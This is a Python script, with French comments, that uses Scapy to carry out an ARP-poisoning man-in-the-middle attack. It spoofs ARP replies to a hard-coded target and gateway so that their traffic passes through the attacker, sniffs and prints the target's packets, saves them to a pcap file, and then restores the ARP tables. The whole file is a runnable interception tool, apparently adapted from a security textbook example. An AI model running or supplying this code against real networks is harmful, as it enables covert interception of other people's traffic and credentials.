from scapy.all import *
import os
import sys
import threading
import signal


def get_mac(ip_adress) :
	response,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_adress),timeout=2,retry=10)#response contient les paquets emis et leurs reponses associes unanswered les paquers sans reponses
	for s,r in response :
		return r[Ether].src
	return None


def packet_callback(packet):
	print(packet.show())



def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
	
	poison_target = ARP()
	poison_target.op = 2 # type d'operation 1 pour request (en broadcast on demande qui a cette ip et la machine repondra moi avec ce mac j'ai cette io) 2 pour reponse
	poison_target.psrc = gateway_ip # ainsi la target pensera que ladresse mac emetrice de ce paquet (nous) correspond a cette adresse ip
	poison_target.pdst = target_ip
	poison_target.hwdst = target_mac

	poison_gateway = ARP()
	poison_gateway.op = 2
	poison_gateway.psrc = target_ip
	poison_gateway.pdst = gateway_ip
	poison_gateway.hwdst = gateway_mac

	print("begining arp poisoning CTRL-C to stop")

	while True :
		try : 
			send(poison_target)
			send(poison_gateway)
			time.sleep(2)
		except KeyboardInterrupt:
			print("handling in threading")
			restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

	print("arp poisoning finished")
	return

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
	# slightly different method using send
	print("[*] Restoring target...")
	send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
	send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
	# signals the main thread to exit
	os.kill(os.getpid(), signal.SIGINT)




target_ip="192.168.0.11"
gateway_ip="192.168.0.254"
interface="eth0"
conf.iface = interface
conf.verb = 0
gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
	print("Failed to get gateway MAC. Exiting.")
	sys.exit(0)
else:
	print("Gateway "+ gateway_ip+" is at "+gateway_mac)

target_mac = get_mac(target_ip)

if target_mac is None:
	print("Failed to get gateway MAC. Exiting.")
	sys.exit(0)
else:
	print("target "+ target_ip+" is at "+target_mac)


poison_thread=threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
	print("starting to sniff")
	bpf_filter="ip host "+target_ip
	packets=sniff(count=10000000000, filter=bpf_filter, iface=interface, prn=packet_callback)
	wrpcap('arper.pcap',packets)
	restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
except KeyboardInterrupt :
	print("handling keyboard interupt")
	restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
	sys.exit(0)



